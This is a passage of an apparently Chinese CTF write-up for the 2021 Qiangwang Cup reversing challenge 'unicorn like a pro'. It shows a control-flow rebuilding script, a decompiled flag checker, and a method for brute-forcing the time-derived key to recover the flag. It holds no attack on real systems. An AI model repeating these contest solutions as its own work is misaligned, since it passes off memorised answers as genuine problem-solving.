<span class="hljs-number">0</span>:<br>            jmp_code = <span class="hljs-string">&quot;jmp _&quot;</span> + <span class="hljs-built_in">hex</span>(node.child1) + <span class="hljs-string">&quot;\n&quot;</span><br>        <span class="hljs-keyword">else</span>:<br>            jmp_code = <span class="hljs-string">&#x27;\n&#x27;</span><br><br>        all_asm += jmp_code<br><br>    all_asm = all_asm.replace(<span class="hljs-string">&quot;endbr64&quot;</span>, <span class="hljs-string">&quot;nop\n&quot;</span> * <span class="hljs-number">4</span>)<br>    code_bin = asm(all_asm)<br>    <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.bin&#x27;</span>, <span class="hljs-string">&#x27;wb&#x27;</span>).write(code_bin)<br>    print(all_asm)<br>    print(<span class="hljs-string">&quot;all nodes: &quot;</span>, <span class="hljs-built_in">len</span>(log_map))<br><br>buildNode(<span class="hljs-number">0x3265B1F5</span>, <span class="hljs-number">0x1000</span>)<br></code></pre></td></tr></table></figure><h2 id="6-提取出来的代码分析"><a href="#6-提取出来的代码分析" class="headerlink" title="6. 提取出来的代码分析"></a>6. 提取出来的代码分析</h2><p>重建控制流，输出 bin 后，代码比较清晰了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// rsp = 0x7777F000</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> __noreturn <span class="hljs-title">sub_4</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">unsigned</span> __int8 v0; <span class="hljs-comment">// al</span><br>  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// eax</span><br>  __int64 v2; <span class="hljs-comment">// rax</span><br>  __int64 xorKey[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-2C0h]</span><br>  __int128 v4; <span class="hljs-comment">// [rsp+21h] [rbp-29Fh] BYREF</span><br>  <span class="hljs-keyword">char</span> v5[<span class="hljs-number">14</span>]; <span class="hljs-comment">// [rsp+31h] [rbp-28Fh] BYREF</span><br>  <span class="hljs-keyword">char</span> v6[<span class="hljs-number">17</span>]; <span class="hljs-comment">// [rsp+3Fh] [rbp-281h] BYREF</span><br>  __int64 compare[<span class="hljs-number">5</span>]; <span class="hljs-comment">// [rsp+50h] [rbp-270h] BYREF</span><br>  __int64 v8; <span class="hljs-comment">// [rsp+78h] [rbp-248h]</span><br>  __int64 FlagInData[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+80h] [rbp-240h] BYREF</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v10; <span class="hljs-comment">// [rsp+C2h] [rbp-1FEh]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v11; <span class="hljs-comment">// [rsp+C3h] [rbp-1FDh]</span><br>  <span class="hljs-keyword">int</span> kk; <span class="hljs-comment">// [rsp+C4h] [rbp-1FCh]</span><br>  __int64 v13; <span class="hljs-comment">// [rsp+C8h] [rbp-1F8h]</span><br>  __int128 *v14; <span class="hljs-comment">// [rsp+D0h] [rbp-1F0h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v15; <span class="hljs-comment">// [rsp+DAh] [rbp-1E6h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v16; <span class="hljs-comment">// [rsp+DBh] [rbp-1E5h]</span><br>  <span class="hljs-keyword">int</span> mm; <span class="hljs-comment">// [rsp+DCh] [rbp-1E4h]</span><br>  __int64 v18; <span class="hljs-comment">// [rsp+E0h] [rbp-1E0h]</span><br>  __int64 v19; <span class="hljs-comment">// [rsp+E8h] [rbp-1D8h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v20; <span class="hljs-comment">// [rsp+F3h] [rbp-1CDh]</span><br>  <span class="hljs-keyword">int</span> jj; <span class="hljs-comment">// [rsp+F4h] [rbp-1CCh]</span><br>  __int64 v22; <span class="hljs-comment">// [rsp+F8h] [rbp-1C8h]</span><br>  __int64 *v23; <span class="hljs-comment">// [rsp+100h] [rbp-1C0h]</span><br>  __int64 *v24; <span class="hljs-comment">// [rsp+108h] [rbp-1B8h]</span><br>  <span class="hljs-keyword">int</span> ii; <span class="hljs-comment">// [rsp+110h] [rbp-1B0h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v26; <span class="hljs-comment">// [rsp+114h] [rbp-1ACh]</span><br>  <span class="hljs-keyword">int</span> v27; <span class="hljs-comment">// [rsp+118h] [rbp-1A8h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v28; <span class="hljs-comment">// [rsp+11Ch] [rbp-1A4h]</span><br>  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *v29; <span class="hljs-comment">// [rsp+120h] [rbp-1A0h]</span><br>  <span class="hljs-keyword">int</span> n; <span class="hljs-comment">// [rsp+12Ch] [rbp-194h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v31; <span class="hljs-comment">// [rsp+130h] [rbp-190h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v32; <span class="hljs-comment">// [rsp+138h] [rbp-188h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v33; <span class="hljs-comment">// [rsp+140h] [rbp-180h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 data2; <span class="hljs-comment">// [rsp+148h] [rbp-178h]</span><br>  <span class="hljs-keyword">int</span> m; <span class="hljs-comment">// [rsp+154h] [rbp-16Ch]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v36; <span class="hljs-comment">// [rsp+158h] [rbp-168h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 data1; <span class="hljs-comment">// [rsp+160h] [rbp-160h]</span><br>  <span class="hljs-keyword">int</span> i_0; <span class="hljs-comment">// [rsp+16Ch] [rbp-154h]</span><br>  __int64 v39; <span class="hljs-comment">// [rsp+170h] [rbp-150h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 from_t0; <span class="hljs-comment">// [rsp+178h] [rbp-148h]</span><br>  __int64 const_32; <span class="hljs-comment">// [rsp+180h] [rbp-140h]</span><br>  __int64 *flag_ptr; <span class="hljs-comment">// [rsp+188h] [rbp-138h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 v43; <span class="hljs-comment">// [rsp+190h] [rbp-130h]</span><br>  __int64 v44; <span class="hljs-comment">// [rsp+198h] [rbp-128h]</span><br>  __int64 *v45; <span class="hljs-comment">// [rsp+1A0h] [rbp-120h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v46; <span class="hljs-comment">// [rsp+202h] [rbp-BEh]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v47; <span class="hljs-comment">// [rsp+203h] [rbp-BDh]</span><br>  <span class="hljs-keyword">int</span> nn; <span class="hljs-comment">// [rsp+204h] [rbp-BCh]</span><br>  __int64 v49; <span class="hljs-comment">// [rsp+208h] [rbp-B8h]</span><br>  <span class="hljs-keyword">char</span> *v50; <span class="hljs-comment">// [rsp+210h] [rbp-B0h]</span><br>  __int64 flagLen; <span class="hljs-comment">// [rsp+218h] [rbp-A8h]</span><br>  __int64 *v52; <span class="hljs-comment">// [rsp+220h] [rbp-A0h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v53; <span class="hljs-comment">// [rsp+22Ah] [rbp-96h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v54; <span class="hljs-comment">// [rsp+22Bh] [rbp-95h]</span><br>  <span class="hljs-keyword">int</span> i1; <span class="hljs-comment">// [rsp+22Ch] [rbp-94h]</span><br>  __int64 v56; <span class="hljs-comment">// [rsp+230h] [rbp-90h]</span><br>  <span class="hljs-keyword">char</span> *v57; <span class="hljs-comment">// [rsp+238h] [rbp-88h]</span><br>  __int64 v58; <span class="hljs-comment">// [rsp+240h] [rbp-80h]</span><br>  __int64 time0; <span class="hljs-comment">// [rsp+248h] [rbp-78h]</span><br>  __int64 v60; <span class="hljs-comment">// [rsp+250h] [rbp-70h]</span><br>  __int64 d2; <span class="hljs-comment">// [rsp+258h] [rbp-68h]</span><br>  __int64 v62; <span class="hljs-comment">// [rsp+260h] [rbp-60h]</span><br>  __int64 d1; <span class="hljs-comment">// [rsp+268h] [rbp-58h]</span><br>  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+274h] [rbp-4Ch]</span><br>  __int64 data0; <span class="hljs-comment">// [rsp+278h] [rbp-48h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v66; <span class="hljs-comment">// [rsp+282h] [rbp-3Eh]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v67; <span class="hljs-comment">// [rsp+283h] [rbp-3Dh]</span><br>  <span class="hljs-keyword">int</span> j; <span class="hljs-comment">// [rsp+284h] [rbp-3Ch]</span><br>  __int64 v69; <span class="hljs-comment">// [rsp+288h] [rbp-38h]</span><br>  <span class="hljs-keyword">char</span> *v70; <span class="hljs-comment">// [rsp+290h] [rbp-30h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v71; <span class="hljs-comment">// [rsp+29Ah] [rbp-26h]</span><br>  <span class="hljs-keyword">unsigned</span> __int8 v72; <span class="hljs-comment">// [rsp+29Bh] [rbp-25h]</span><br>  <span class="hljs-keyword">int</span> k; <span class="hljs-comment">// [rsp+29Ch] [rbp-24h]</span><br>  __int64 v74; <span class="hljs-comment">// [rsp+2A0h] [rbp-20h]</span><br>  __int64 *flagIn; <span class="hljs-comment">// [rsp+2A8h] [rbp-18h]</span><br>  __int64 v76; <span class="hljs-comment">// [rsp+2B0h] [rbp-10h]</span><br>  <span class="hljs-keyword">unsigned</span> __int64 time0_1; <span class="hljs-comment">// [rsp+2B8h] [rbp-8h]</span><br><br>  v58 = <span class="hljs-number">0x7177625F32303231</span>i64;<br>  __writefsqword(<span class="hljs-number">0</span>, <span class="hljs-number">0x7177625F32303231</span>ui64);<br>  __asm &#123; syscall; Low latency system call &#125;<br>  time0 = MEMORY[<span class="hljs-number">0x1337</span>];                       <span class="hljs-comment">// time(0)</span><br>  time0_1 = MEMORY[<span class="hljs-number">0x1337</span>];<br>  v2 = MEMORY[<span class="hljs-number">0x1337</span>] / <span class="hljs-number">0xE10</span>ui64;<br>  data0 = MEMORY[<span class="hljs-number">0x1337</span>] / <span class="hljs-number">0xE10</span>ui64;<br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i != <span class="hljs-number">256</span>; ++i )<br>  &#123;<br>    d1 = <span class="hljs-number">0</span>i64;<br>    d1 = *(_QWORD *)v2;<br>    v62 = d1;<br>    d2 = <span class="hljs-number">0</span>i64;<br>    d2 = *(_QWORD *)(d1 + <span class="hljs-number">1</span>);<br>    v60 = d2;<br>    data0 = __ROL8__((data0 ^ d1) + d2 + <span class="hljs-number">33</span> * data0 + <span class="hljs-number">1</span>, <span class="hljs-number">13</span>);<br>    <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>      data0 = v60 ^ (v62 + data0);<br>    <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span> )<br>      data0 ^= v62 + v60;<br>    <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">4</span>) != <span class="hljs-number">0</span> )<br>      data0 ^= v60 ^ v62;<br>    v2 = i &amp; <span class="hljs-number">8</span>;<br>    <span class="hljs-keyword">if</span> ( (i &amp; <span class="hljs-number">8</span>) != <span class="hljs-number">0</span> )<br>    &#123;<br>      v2 = data0 + v62 + v60;<br>      data0 = v2;<br>    &#125;<br>  &#125;<br>  v76 = data0;<br>  <span class="hljs-built_in">strcpy</span>(v6, <span class="hljs-string">&quot;input flag:\n&quot;</span>);<br>  v70 = v6;<br>  v69 = <span class="hljs-number">12</span>i64;<br>  <span class="hljs-keyword">for</span> ( j = <span class="hljs-number">0</span>; v69 != j; ++j )<br>  &#123;<br>    v67 = v70[j];<br>    v66 = v67;<br>    __outbyte(<span class="hljs-number">1u</span>, v67);                         <span class="hljs-comment">// putchar</span><br>  &#125;<br>  <span class="hljs-built_in">memset</span>(FlagInData, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(FlagInData));<br>  flagIn = FlagInData;<br>  v74 = <span class="hljs-number">0x40</span>i64;<br>  <span class="hljs-keyword">for</span> ( k = <span class="hljs-number">0</span>; ; ++k )<br>  &#123;<br>    <span class="hljs-keyword">if</span> ( v74 == k )<br>      <span class="hljs-keyword">goto</span> LABEL_3;<br>    v0 = __inbyte(<span class="hljs-number">0</span>);                           <span class="hljs-comment">// get_char</span><br>    v72 = v0;<br>    v71 = v0;<br>    <span class="hljs-keyword">if</span> ( v0 == <span class="hljs-string">&#x27;\n&#x27;</span> )<br>      <span class="hljs-keyword">break</span>;<br>    *((_BYTE *)flagIn + k) = v71;<br>  &#125;<br>  *((_BYTE *)flagIn + k) = <span class="hljs-number">0</span>;<br>LABEL_3:<br>  <span class="hljs-keyword">if</span> ( v76 == <span class="hljs-number">0x1C986C3B22EA63E5</span>i64 )<br>  &#123;<br>    v52 = FlagInData;<br>    <span class="hljs-keyword">for</span> ( flagLen = <span class="hljs-number">0</span>i64; *((_BYTE *)v52 + flagLen); ++flagLen )<br>      ;<br>    v8 = flagLen;<br>    <span class="hljs-keyword">if</span> ( flagLen == <span class="hljs-number">32</span> )<br>    &#123;<br>      v45 = FlagInData;<br>      v44 = <span class="hljs-number">32</span>i64;<br>      v43 = time0_1 / <span class="hljs-number">0xE10</span>;<br>      flag_ptr = FlagInData;<br>      const_32 = <span class="hljs-number">32</span>i64;<br>      from_t0 = time0_1 / <span class="hljs-number">0xE10</span>;<br>      v39 = <span class="hljs-number">0x5249415452455451</span>i64;<br>      __writefsqword(<span class="hljs-number">0</span>, <span class="hljs-number">0x5249415452455451</span>ui64);<br>      <span class="hljs-keyword">for</span> ( i_0 = <span class="hljs-number">0</span>; const_32 != i_0; ++i_0 )<br>      &#123;<br>        data1 = __readfsqword(<span class="hljs-number">0</span>);               <span class="hljs-comment">// 0x5249415452455451</span><br>        v36 = i_0;<br>        <span class="hljs-keyword">for</span> ( m = <span class="hljs-number">0</span>; m != <span class="hljs-number">256</span>; ++m )<br>        &#123;<br>          data2 = __readfsqword(<span class="hljs-number">0</span>);<br>          v33 = data2;<br>          v32 = data2;<br>          v31 = data2;<br>          v36 = (v36 ^ data2) + data2 + <span class="hljs-number">0x21</span> * v36 + <span class="hljs-number">1</span>;<br>          v36 = __ROL8__(v36, <span class="hljs-number">13</span>);<br>          <span class="hljs-keyword">if</span> ( (m &amp; <span class="hljs-number">1</span>) != <span class="hljs-number">0</span> )<br>            v36 = v31 ^ (v33 + v36);<br>          <span class="hljs-keyword">if</span> ( (m &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span> )<br>            v36 ^= v33 + v31;<br>          <span class="hljs-keyword">if</span> ( (m &amp; <span class="hljs-number">4</span>) != <span class="hljs-number">0</span> )<br>            v36 ^= v31 ^ v33;<br>          <span class="hljs-keyword">if</span> ( (m &amp; <span class="hljs-number">8</span>) != <span class="hljs-number">0</span> )<br>            v36 += v33 + v31;<br>        &#125;<br>        *((_BYTE *)flag_ptr + i_0) ^= (_BYTE)data1 + (_BYTE)v36;<br>      &#125;<br>      <span class="hljs-keyword">for</span> ( n = <span class="hljs-number">0</span>; const_32 != n; n += <span class="hljs-number">4</span> )      <span class="hljs-comment">// 4字节一组</span><br>      &#123;<br>        v29 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> *)((<span class="hljs-keyword">char</span> *)flag_ptr + n);<br>        v28 = *v29;<br>        v27 = <span class="hljs-number">0</span>;<br>        v26 = v28;<br>        v28 = from_t0 + _mm_crc32_u32(<span class="hljs-number">0</span>, v28);<br>        *v29 = v28;<br>      &#125;<br>      xorKey[<span class="hljs-number">0</span>] = <span class="hljs-number">0x178DEC4F232DDB6E</span>i64;<br>      xorKey[<span class="hljs-number">1</span>] = <span class="hljs-number">0xC2AAB7D6D2A167C3</span>ui64;<br>      xorKey[<span class="hljs-number">2</span>] = <span class="hljs-number">0xF1AB91F72761A80F</span>ui64;<br>      xorKey[<span class="hljs-number">3</span>] = <span class="hljs-number">0x3DCEDC28076C41A</span>i64;<br>      <span class="hljs-keyword">for</span> ( ii = <span class="hljs-number">0</span>; v44 != ii; ++ii )<br>        *((_BYTE *)v45 + ii) ^= *((_BYTE *)xorKey + ii);<br>      compare[<span class="hljs-number">0</span>] = <span class="hljs-number">0x3EC81D9432CEF584</span>i64;<br>      compare[<span class="hljs-number">1</span>] = <span class="hljs-number">0xB649A4DCD6BD24FE</span>ui64;<br>      compare[<span class="hljs-number">2</span>] = <span class="hljs-number">0xC5927F0B767A787D</span>ui64;<br>      compare[<span class="hljs-number">3</span>] = <span class="hljs-number">0x1F245B7F751BB52E</span>i64;<br>      v24 = FlagInData;<br>      v23 = compare;<br>      v22 = v8;<br>      <span class="hljs-keyword">for</span> ( jj = <span class="hljs-number">0</span>; ; ++jj )<br>      &#123;<br>        <span class="hljs-keyword">if</span> ( v22 == jj )<br>        &#123;<br>          v1 = <span class="hljs-number">0</span>;<br>          <span class="hljs-keyword">goto</span> LABEL_47;<br>        &#125;<br>        v20 = *((_BYTE *)v24 + jj) - *((_BYTE *)v23 + jj);<br>        <span class="hljs-keyword">if</span> ( v20 )<br>          <span class="hljs-keyword">break</span>;<br>      &#125;<br>      v1 = v20;<br>LABEL_47:<br>      <span class="hljs-keyword">if</span> ( v1 )<br>      &#123;<br>        <span class="hljs-built_in">strcpy</span>((<span class="hljs-keyword">char</span> *)&amp;v4, <span class="hljs-string">&quot;wrong\n&quot;</span>);<br>        v14 = &amp;v4;<br>        v13 = <span class="hljs-number">6</span>i64;<br>        <span class="hljs-keyword">for</span> ( kk = <span class="hljs-number">0</span>; v13 != kk; ++kk )<br>        &#123;<br>          v11 = *((_BYTE *)v14 + kk);<br>          v10 = v11;<br>          __outbyte(<span class="hljs-number">1u</span>, v11);<br>        &#125;<br>      &#125;<br>      <span class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">strcpy</span>((<span class="hljs-keyword">char</span> *)&amp;v4 + <span class="hljs-number">7</span>, <span class="hljs-string">&quot;correct\n&quot;</span>);<br>        v19 = (__int64)&amp;v4 + <span class="hljs-number">7</span>;<br>        v18 = <span class="hljs-number">8</span>i64;<br>        <span class="hljs-keyword">for</span> ( mm = <span class="hljs-number">0</span>; v18 != mm; ++mm )<br>        &#123;<br>          v16 = *(_BYTE *)(mm + v19);<br>          v15 = v16;<br>          __outbyte(<span class="hljs-number">1u</span>, v16);<br>        &#125;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      <span class="hljs-built_in">strcpy</span>(v5, <span class="hljs-string">&quot;wrong\n&quot;</span>);<br>      v50 = v5;<br>      v49 = <span class="hljs-number">6</span>i64;<br>      <span class="hljs-keyword">for</span> ( nn = <span class="hljs-number">0</span>; v49 != nn; ++nn )<br>      &#123;<br>        v47 = v50[nn];<br>        v46 = v47;<br>        __outbyte(<span class="hljs-number">1u</span>, v47);<br>      &#125;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    *(_DWORD *)&amp;v5[7] = &#x27;norw&#x27;;<br>    *(_WORD *)&amp;v5[11] = &#x27;\ng&#x27;;<br>    v5[<span class="hljs-number">13</span>] = <span class="hljs-number">0</span>;<br>    v57 = &amp;v5[<span class="hljs-number">7</span>];<br>    v56 = <span class="hljs-number">6</span>i64;<br>    <span class="hljs-keyword">for</span> ( i1 = <span class="hljs-number">0</span>; v56 != i1; ++i1 )<br>    &#123;<br>      v54 = v57[i1];<br>      v53 = v54;<br>      __outbyte(<span class="hljs-number">1u</span>, v54);<br>    &#125;<br>  &#125;<br>  __halt();<br>&#125;<br></code></pre></td></tr></table></figure><p>程序入口调用 syscall，由 unicorn 回调处理获取 time(0) 的值，并根据该值计算一个数 0x1C986C3B22EA63E5</p><img src="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/image-20210614143020439.png" class="" title="image-20210614143020439">为了屏蔽 ida 的优化，方便分析，我做了一些小 patch<ul><li>syscall 的 unicorn 回调会修改 rax 寄存器，但是 ida 认为 rax 的值是一个可计算的常数，于是后面与 rax 有关的表达式都被优化。</li><li>for 循环中读取了两次 fs:0 , 有unicorn回调，每次读取的值肯定不一样，ida 认为两次读取的值一样，于是优化成一次访问。</li></ul><p>手动 patch ，即可解决这些问题。</p><p>有两种爆破思路：</p><ul><li>直接爆破 time(0)</li><li>根据 flag 信息反向爆破</li></ul><p>可以用 flag 开头来爆破 time(0) 时间常数</p><p>from_t0 = time_0 / 0xE10;</p><img src="/2021/06/14/%E5%BC%BA%E7%BD%91%E6%9D%AF-unicorn-like-a-pro/image-20210614142739068.png" class="" title="image-20210614142739068"><p>由于 4字节一组，<code>qwb&#123;</code>与<code>QWB&#123;</code> 与 <code>flag</code> 与 <code>FLAG</code> 都是已知的 4 个字节并且 v28 可以非常轻松的获得</p><p>通过爆破开头也可以反推 time(0)</p><p>爆破出 time(0) 后的做法就是非常简单的计算任务了</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span 